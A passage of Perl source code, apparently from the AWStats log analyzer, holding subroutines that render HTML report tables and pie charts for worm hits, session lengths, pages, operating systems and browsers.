\\%_worm_h,\n\t\t\\%_worm_h );\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . ( $WormsHashLib{$key} ? $WormsHashLib{$key} : $key )\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" ) . \"</td>\";\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . ( $WormsHashTarget{$key} ? $WormsHashTarget{$key} : $key )\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" ) . \"</td>\";\n\t\tif ( $ShowWormsStats =~ /H/i ) {\n\t\t\tprint \"<td>\" . Format_Number($_worm_h{$key}) . \"</td>\";\n\t\t}\n\t\tif ( $ShowWormsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes( $_worm_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowWormsStats =~ /L/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_worm_l{$key}\n\t\t\t\t? Format_Date( $_worm_l{$key}, 1 )\n\t\t\t\t: '-'\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_worm_p{$key};\n\t\t$total_h += $_worm_h{$key};\n\t\t$total_k += $_worm_k{$key} || 0;\n\t\t$count++;\n\t}\n\n\t# For worms we need to count Totals\n\tmy $TotalPagesWorms =\n\t  0;    #foreach (values %_worm_p) { $TotalPagesWorms+=$_; }\n\tmy $TotalHitsWorms = 0;\n\tforeach ( values %_worm_h ) { $TotalHitsWorms += $_; }\n\tmy $TotalBytesWorms = 0;\n\tforeach ( values %_worm_k ) { $TotalBytesWorms += $_; }\n\tmy $rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;\n\tmy $rest_h = $TotalHitsWorms - $total_h;\n\tmy $rest_k = $TotalBytesWorms - $total_k;\n\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 ) { # All other worms\n\t\tprint \"<tr>\";\n\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td class=\\\"aws\\\">-</td>\";\n\t\tif ( $ShowWormsStats =~ /H/i ) {\n\t\t\tprint \"<td>\" . Format_Number(($rest_h)) . \"</td>\";\n\t\t}\n\t\tif ( $ShowWormsStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . ( Format_Bytes($rest_k) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowWormsStats =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end(\"* $Message[158]\");\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the sessions chart and table\n# Parameters:   -\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainSessions{\n\tif ($Debug) { debug( \"ShowSessionsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"sessions\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[117]\";\n\t&tab_head( $title, 19, 0, 'sessions' );\n\tmy $Totals = 0;\n\tmy $average_s = 0;\n\tforeach (@SessionsRange) {\n\t\t$average_s += ( $_session{$_} || 0 ) * $SessionsAverage{$_};\n\t\t$Totals += $_session{$_} || 0;\n\t}\n\tif ($Totals) { $average_s = int( $average_s / $Totals ); }\n\telse { $average_s = '?'; }\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t  . Tooltip(1)\n\t  . \"><th>$Message[10]: \".Format_Number($TotalVisits).\" - $Message[96]: \".Format_Number($average_s).\" s</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[10]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\t$average_s = 0;\n\tmy $total_s   = 0;\n\tmy $count = 0;\n\tforeach my $key (@SessionsRange) {\n\t\tmy $p = 0;\n\t\tif ($TotalVisits) {\n\t\t\t$p = int( $_session{$key} / $TotalVisits * 1000 ) / 10;\n\t\t}\n\t\t$total_s += $_session{$key} || 0;\n\t\tprint \"<tr><td class=\\\"aws\\\">$key</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_session{$key} ? Format_Number($_session{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_session{$key} ? \"$p %\" : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\tmy $rest_s = $TotalVisits - $total_s;\n\tif ( $rest_s > 0 ) {    # All others sessions\n\t\tmy $p = 0;\n\t\tif ($TotalVisits) {\n\t\t\t$p = int( $rest_s / $TotalVisits * 1000 ) / 10;\n\t\t}\n\t\tprint \"<tr\"\n\t\t  . Tooltip(20)\n\t\t  . \"><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\";\n\t\tprint \"<td>\".Format_Number($rest_s).\"</td>\";\n\t\tprint \"<td>\" . ( $rest_s ? \"$p %\" : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the pages chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainPages{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) {\n\t\tdebug(\n\"ShowPagesStats (MaxNbOf{'PageShown'}=$MaxNbOf{'PageShown'} TotalDifferentPages=$TotalDifferentPages)\",\n\t\t\t2\n\t\t);\n\t}\n\tmy $regext         = qr/\\.(\\w{1,6})$/;\n\tprint\n\"$Center<a name=\\\"urls\\\">&nbsp;</a><a name=\\\"entry\\\">&nbsp;</a><a name=\\\"exit\\\">&nbsp;</a><br />\\n\";\n\tmy $title =\n\"$Message[19] ($Message[77] $MaxNbOf{'PageShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=urldetail\")\n\t\t: \"$StaticLinks.urldetail.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=urlentry\")\n\t\t\t: \"$StaticLinks.urlentry.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[104]</a>\";\n\t}\n\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=urlexit\")\n\t\t\t: \"$StaticLinks.urlexit.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[116]</a>\";\n\t}\n\t\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=SIDER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t\n\t&tab_head( \"$title\", 19, 0, 'urls' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\".Format_Number($TotalDifferentPages).\" $Message[28]</th>\";\n\tif ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[29]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /B/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /E/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_e\\\" width=\\\"80\\\">$Message[104]</th>\";\n\t}\n\tif ( $ShowPagesStats =~ /X/i ) {\n\t\tprint\n\t\t  \"<th bgcolor=\\\"#$color_x\\\" width=\\\"80\\\">$Message[116]</th>\";\n\t}\n\n\t# Call to plugins' function ShowPagesAddField\n\tforeach\n\t  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t{\n\n\t\t#\t\t\t\tmy $function=\"ShowPagesAddField_$pluginname('title')\";\n\t\t#\t\t\t\teval(\"$function\");\n\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t&$function('title');\n\t}\n\tprint \"<th>&nbsp;</th></tr>\\n\";\n\tmy $total_p = my $total_e = my $total_x = my $total_k = 0;\n\tmy $max_p   = 1;\n\tmy $max_k   = 1;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \\%_url_p,\n\t\t\\%_url_p );\n\tforeach my $key (@keylist) {\n\t\tif ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }\n\t\tif ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {\n\t\t\t$max_k = $_url_k{$key} / ( $_url_p{$key} || 1 );\n\t\t}\n\t}\n\tforeach my $key (@keylist) {\n\t\tprint \"<tr><td class=\\\"aws\\\">\";\n\t\t&HTMLShowURLInfo($key);\n\t\tprint \"</td>\";\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_e = 0;\n\t\tmy $bredde_x = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_e =\n\t\t\t  int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_x =\n\t\t\t  int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k =\n\t\t\t  int( $BarWidth *\n\t\t\t\t  ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /\n\t\t\t\t  $max_k ) + 1;\n\t\t}\n\t\tif ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }\n\t\tif ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {\n\t\t\tprint \"<td>\".Format_Number($_url_p{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {\n\t\t\tprint \"<td>\".Format_Number($_url_p{$key}).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$_url_k{$key}\n\t\t\t\t? Format_Bytes(\n\t\t\t\t\t$_url_k{$key} / ( $_url_p{$key} || 1 )\n\t\t\t\t  )\n\t\t\t\t: \"&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\n\t\t# Call to plugins' function ShowPagesAddField\n\t\tforeach my $pluginname (\n\t\t\tkeys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t\t{\n\n\t\t\t#\t\t\t\t\tmy $function=\"ShowPagesAddField_$pluginname('$key')\";\n\t\t\t#\t\t\t\t\teval(\"$function\");\n\t\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t\t&$function($key);\n\t\t}\n\t\tprint \"<td class=\\\"aws\\\">\";\n\t\tif ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_p\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hk'}\\\" width=\\\"$bredde_k\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'he'}\\\" width=\\\"$bredde_e\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /><br />\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hx'}\\\" width=\\\"$bredde_x\\\" height=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"\") . \" />\";\n\t\t}\n\t\tprint \"</td></tr>\\n\";\n\t\t$total_p += $_url_p{$key} || 0;\n\t\t$total_e += $_url_e{$key} || 0;\n\t\t$total_x += $_url_x{$key} || 0;\n\t\t$total_k += $_url_k{$key} || 0;\n\t\t$count++;\n\t}\n\tmy $rest_p = $TotalPages - $total_p;\n\tmy $rest_e = $TotalEntries - $total_e;\n\tmy $rest_x = $TotalExits - $total_x;\n\tmy $rest_k = $TotalBytesPages - $total_k;\n\tif ( $rest_p > 0 || $rest_k > 0 || $rest_e > 0 || $rest_x > 0 )\n\t{    # All other urls\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {\n\t\t\tprint \"<td>\".Format_Number($rest_p).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {\n\t\t\tprint \"<td>\".Format_Number($rest_p).\"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /B/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$rest_k\n\t\t\t\t? Format_Bytes( $rest_k / ( $rest_p || 1 ) )\n\t\t\t\t: \"&nbsp;\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\tprint \"<td>\" . ( $rest_e ? Format_Number($rest_e) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\tprint \"<td>\" . ( $rest_x ? Format_Number($rest_x) : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\n\t\t# Call to plugins' function ShowPagesAddField\n\t\tforeach my $pluginname (\n\t\t\tkeys %{ $PluginsLoaded{'ShowPagesAddField'} } )\n\t\t{\n\n\t\t\t#\t\t\t\t\tmy $function=\"ShowPagesAddField_$pluginname('')\";\n\t\t\t#\t\t\t\t\teval(\"$function\");\n\t\t\tmy $function = \"ShowPagesAddField_$pluginname\";\n\t\t\t&$function('');\n\t\t}\n\t\tprint \"<td>&nbsp;</td></tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the OS chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainOS{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\n\tif ($Debug) { debug( \"ShowOSStats\", 2 ); }\n\tprint \"$Center<a name=\\\"os\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh   = 0;\n\tmy $Totalp   = 0;\n\tmy %new_os_h = ();\n\tmy %new_os_p = ();\n  OSLOOP: foreach my $key ( keys %_os_h ) {\n\t\t$Totalh += $_os_h{$key};\n\t\t$Totalp += $_os_p{$key};\n\t\tforeach my $family ( keys %OSFamily ) {\n\t\t\tif ( $key =~ /^$family/i ) {\n\t\t\t\t$new_os_h{\"${family}cumul\"} += $_os_h{$key};\n\t\t\t\t$new_os_p{\"${family}cumul\"} += $_os_p{$key};\n\t\t\t\tnext OSLOOP;\n\t\t\t}\n\t\t}\n\t\t$new_os_h{$key} += $_os_h{$key};\n\t\t$new_os_p{$key} += $_os_p{$key};\n\t}\n\tmy $title =\n\"$Message[59] ($Message[77] $MaxNbOf{'OsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=osdetail\")\n\t\t: \"$StaticLinks.osdetail.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]/$Message[58]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=unknownos\")\n\t\t: \"$StaticLinks.unknownos.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[0]</a>\";\n\t  \n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=OS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t  \n\t&tab_head( \"$title\", 19, 0, 'os' );\n\t\n\t&BuildKeyList( $MaxNbOf{'OsShown'}, $MinHit{'Os'}, \\%new_os_h,\n\t\t\\%new_os_p );\n\t\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int(  $new_os_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t\tif ($key eq 'Unknown'){push @blocklabel, \"$key\"; }\n\t\t\t\telse{\n\t\t\t\t\tmy $keywithoutcumul = $key;\n\t\t\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\t\t\tmy $libos = $OSHashLib{$keywithoutcumul}\n\t\t\t\t\t  || $keywithoutcumul;\n\t\t\t\t\tmy $nameicon = $keywithoutcumul;\n\t\t\t\t\t$nameicon =~ s/[^\\w]//g;\n\t\t\t\t\tif ( $OSFamily{$keywithoutcumul} ) {\n\t\t\t\t\t\t$libos = $OSFamily{$keywithoutcumul};\n\t\t\t\t\t}\n\t\t\t\t\tpush @blocklabel, \"$libos\";\n\t\t\t\t}\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"5\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"Top 5 Operating Systems\",       \"oss\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"$WIDTHCOLICON\\\">&nbsp;</th><th>$Message[59]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $total_p = 0;\n\tmy $count = 0;\n\t\n\tforeach my $key (@keylist) {\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($Totalh) {\n\t\t\t$p_h = int( $new_os_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($Totalp) {\n\t\t\t$p_p = int( $new_os_p{$key} / $Totalp * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/os\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\"\n\t\t\t  . \"<td>\".Format_Number($_os_p{$key}).\"</td><td>$p_p</td><td>\".Format_Number($_os_h{$key}).\"</td><td>$p_h</td></tr>\\n\";\n\t\t}\n\t\telse {\n\t\t\tmy $keywithoutcumul = $key;\n\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\tmy $libos = $OSHashLib{$keywithoutcumul}\n\t\t\t  || $keywithoutcumul;\n\t\t\tmy $nameicon = $keywithoutcumul;\n\t\t\t$nameicon =~ s/[^\\w]//g;\n\t\t\tif ( $OSFamily{$keywithoutcumul} ) {\n\t\t\t\t$libos = \"<b>\" . $OSFamily{$keywithoutcumul} . \"</b>\";\n\t\t\t}\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/os\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$libos</td><td>\".Format_Number($new_os_p{$key}).\"</td><td>$p_p</td><td>\".Format_Number($new_os_h{$key}).\"</td><td>$p_h</td></tr>\\n\";\n\t\t}\n\t\t$total_h += $new_os_h{$key};\n\t\t$total_p += $new_os_p{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug( \"Total real / shown : $Totalh / $total_h\", 2 );\n\t}\n\tmy $rest_h = $Totalh - $total_h;\n\tmy $rest_p = $Totalp - $total_p;\n\tif ( $rest_h > 0 ) {\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }\n\t\tif ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }\n\t\tprint \"<tr>\";\n\t\tprint \"<td>&nbsp;</td>\";\n\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td><td>\".Format_Number($rest_p).\"</td>\";\n\t\tprint \"<td>$p_p %</td><td>\".Format_Number($rest_h).\"</td><td>$p_h %</td></tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Browsers chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainBrowsers{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowBrowsersStats\", 2 ); }\n\tprint \"$Center<a name=\\\"browsers\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh        = 0;\n\tmy $Totalp        = 0;\n\tmy %new_browser_h = ();\n\tmy %new_browser_p = ();\n  BROWSERLOOP: foreach my $key ( keys %_browser_h ) {\n\t\t$Totalh += $_browser_h{$key};\n\t\t$Totalp += $_browser_p{$key};\n\t\tforeach my $family ( keys %BrowsersFamily ) {\n\t\t\tif ( $key =~ /^$family/i ) {\n\t\t\t\t$new_browser_h{\"${family}cumul\"} += $_browser_h{$key};\n\t\t\t\t$new_browser_p{\"${family}cumul\"} += $_browser_p{$key};\n\t\t\t\tnext BROWSERLOOP;\n\t\t\t}\n\t\t}\n\t\t$new_browser_h{$key} += $_browser_h{$key};\n\t\t$new_browser_p{$key} += $_browser_p{$key};\n\t}\n\tmy $title =\n\"$Message[21] ($Message[77] $MaxNbOf{'BrowsersShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=browserdetail\")\n\t\t: \"$StaticLinks.browserdetail.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]/$Message[58]</a> &nbsp; - &nbsp; <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=unknownbrowser\")\n\t\t: \"$StaticLinks.unknownbrowser.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[0]</a>\";\n\t  \n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=BROWSER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t  \n\t&tab_head( \"$title\", 19, 0, 'browsers' );\n\t\n\t&BuildKeyList(\n\t\t$MaxNbOf{'BrowsersShown'}, $MinHit{'Browser'},\n\t\t\\%new_browser_h,           \\%new_browser_p\n\t);\n\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int(  $new_browser_h{$key} / $TotalHits * 1000 ) / 10;\n\t\t\t\tif ($key eq 'Unknown'){push @blocklabel, \"$key\"; }\n\t\t\t\telse{\n\t\t\t\t\tmy $keywithoutcumul = $key;\n\t\t\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\t\t\tmy $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}\n\t\t\t\t\t  || $keywithoutcumul;\n\t\t\t\t\tmy $nameicon = $BrowsersHashIcon{$keywithoutcumul}\n\t\t\t\t\t  || \"notavailable\";\n\t\t\t\t\tif ( $BrowsersFamily{$keywithoutcumul} ) {\n\t\t\t\t\t\t$libbrowser = \"$libbrowser\";\n\t\t\t\t\t}\n\t\t\t\t\tpush @blocklabel, \"$libbrowser\";\n\t\t\t\t}\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"5\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"Top 5 Browsers\",       \"browsers\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           